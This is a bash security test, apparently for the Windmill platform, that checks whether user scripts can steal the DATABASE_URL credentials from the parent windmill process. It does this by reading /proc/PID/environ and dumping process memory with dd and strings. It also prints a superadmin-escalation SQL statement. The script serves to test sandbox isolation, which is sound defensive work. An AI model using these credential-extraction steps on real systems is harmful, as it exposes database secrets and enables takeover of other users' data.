#!/bin/bash
# Security test: Attempt to extract DATABASE_URL from windmill process memory
# This demonstrates why nsjail sandboxing is critical for production deployments

echo "=== DATABASE_URL Memory Extraction Proof-of-Concept ==="
echo ""
echo "This script demonstrates that without proper sandboxing (nsjail),"
echo "user scripts can potentially extract credentials from process memory."
echo ""

# Find the actual windmill process (not the script runner)
echo "[1/5] Locating windmill process..."
windmill_pid=$(ps aux | grep -E "windmill$|/windmill$|target/(debug|release)/windmill$" | grep -v grep | grep -v node_modules | awk '{print $2}' | head -1)

if [ -z "$windmill_pid" ]; then
    echo "✓ No windmill parent process visible"
    echo "  This is GOOD - means nsjail PID namespace isolation is working!"
    echo ""
    echo "Result: ✅ SECURE - Cannot see parent windmill process"
    exit 0
fi

echo "  Found windmill PID: $windmill_pid"

# Attack Vector 1: /proc/environ (MOST RELIABLE - check this FIRST)
echo ""
echo "[2/6] Attack Vector 1: Reading /proc/$windmill_pid/environ..."
if [ -r /proc/$windmill_pid/environ ]; then
    echo "  ⚠️ Environment file IS readable"
    extracted=$(cat /proc/$windmill_pid/environ 2>/dev/null | tr '\0' '\n' | grep "^DATABASE_URL=")

    if [ -n "$extracted" ]; then
        echo ""
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo "❌❌❌ CRITICAL VULNERABILITY ❌❌❌"
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo ""
        echo "DATABASE_URL successfully extracted from /proc/environ:"
        echo ""
        echo "$extracted"
        echo ""
        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        echo ""
        echo "ATTACK IMPACT:"
        echo "  • Full database credentials exposed"
        echo "  • Direct PostgreSQL access possible"
        echo "  • Can escalate to superadmin via:"
        echo "    UPDATE password SET super_admin=TRUE WHERE username='attacker'"
        echo "  • Full workspace data access and modification"
        echo ""
        echo "EXPLOITATION DIFFICULTY:"
        echo "  • Skill level: TRIVIAL (cat, tr, grep - standard Linux)"
        echo "  • Time required: < 1 second"
        echo "  • Privileges needed: None (same UID as worker)"
        echo ""
        echo "MITIGATION:"
        echo "  ✅ Enable PID namespace isolation (ENABLE_UNSHARE_PID=true)"
        echo "  ✅ Or use NSJAIL sandboxing"
        echo ""
        exit 1
    fi
    echo "  DATABASE_URL not found in environ"
else
    echo "  ✅ Cannot read /proc/$windmill_pid/environ (protected by PID isolation)"
fi

# Check if we can read the process memory
echo ""
echo "[3/6] Checking memory access permissions..."
if [ ! -r /proc/$windmill_pid/mem ]; then
    echo "✓ Cannot read process memory"
    echo "  This is GOOD - means proper isolation is in place!"
    echo ""
    echo "Result: ✅ SECURE - Memory access blocked"
    exit 0
fi

echo "  ⚠️ Process memory IS readable"

# Get heap memory region
echo ""
echo "[4/6] Identifying heap memory region..."
heap_info=$(grep '\[heap\]' /proc/$windmill_pid/maps 2>/dev/null | head -1)

if [ -z "$heap_info" ]; then
    echo "  Cannot read memory maps"
    echo "Result: ✅ SECURE - Memory maps not accessible"
    exit 0
fi

heap_range=$(echo "$heap_info" | awk '{print $1}')
heap_start=$(echo "$heap_range" | cut -d'-' -f1)
echo "  Heap region: $heap_range"

# Attempt extraction from memory regions
echo ""
echo "[5/6] Attempting to extract DATABASE_URL from memory regions..."
echo "  (This may take a few seconds...)"

extracted=""

# Get all readable memory regions (heap, stack, anon)
regions=$(grep -E 'heap|stack|\[anon' /proc/$windmill_pid/maps 2>/dev/null | awk '{print $1}' | head -10)

for region in $regions; do
    start=$(echo "$region" | cut -d'-' -f1)
    end=$(echo "$region" | cut -d'-' -f2)

    # Calculate size
    start_dec=$((0x$start))
    end_dec=$((0x$end))
    size_kb=$((($end_dec - $start_dec) / 1024))

    # Skip if too large (> 100MB)
    if [ $size_kb -gt 102400 ]; then
        continue
    fi

    echo "  Searching region $region (${size_kb}KB)..."

    # Try to extract using strings on the memory region
    skip_blocks=$((0x$start / 4096))
    count_blocks=$(((($end_dec - $start_dec) / 4096) + 1))

    # Limit count to reasonable size
    if [ $count_blocks -gt 25000 ]; then
        count_blocks=25000
    fi

    # Search for DATABASE_URL in this region
    result=$(timeout 5 dd if=/proc/$windmill_pid/mem bs=4096 skip=$skip_blocks count=$count_blocks 2>/dev/null | strings -n 20 | grep -E "postgres://.*changeme|postgres://postgres:.*@" | grep -v "extracted=" | grep -v "result=" | head -1)

    if [ -n "$result" ]; then
        extracted="$result"
        echo "  ✓ Found in $region!"
        break
    fi
done

echo ""
echo "[6/6] Memory extraction results:"
echo ""

if [ -n "$extracted" ]; then
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "❌❌❌ CRITICAL VULNERABILITY (Memory Extraction) ❌❌❌"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo ""
    echo "DATABASE_URL successfully extracted from process memory regions:"
    echo ""
    echo "$extracted"
    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo ""
    echo "ATTACK IMPACT:"
    echo "  • Full database credentials exposed from heap/stack memory"
    echo "  • Direct PostgreSQL access possible"
    echo "  • Can escalate to superadmin via:"
    echo "    UPDATE password SET super_admin=TRUE WHERE username='attacker'"
    echo "  • Full workspace data access and modification"
    echo ""
    echo "EXPLOITATION DIFFICULTY:"
    echo "  • Skill level: LOW-MEDIUM (dd, strings, grep)"
    echo "  • Time required: 5-30 seconds"
    echo "  • Privileges needed: Same UID as worker (default)"
    echo ""
    echo "MITIGATION:"
    echo "  ✅ Enable PID namespace isolation (ENABLE_UNSHARE_PID=true)"
    echo "  ✅ Or use NSJAIL sandboxing"
    echo ""
    exit 1
else
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "⚠️ DATABASE_URL not found in heap/stack memory regions"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo ""
    echo "Memory extraction failed, but this doesn't mean system is secure:"
    echo "  • Credentials may be in other memory regions not searched"
    echo "  • May require more sophisticated extraction tools"
    echo "  • /proc/environ extraction (Attack Vector 1) already succeeded"
    echo ""
    echo "RECOMMENDATION: Enable PID namespace isolation or NSJAIL"
    echo ""
    exit 1
fi
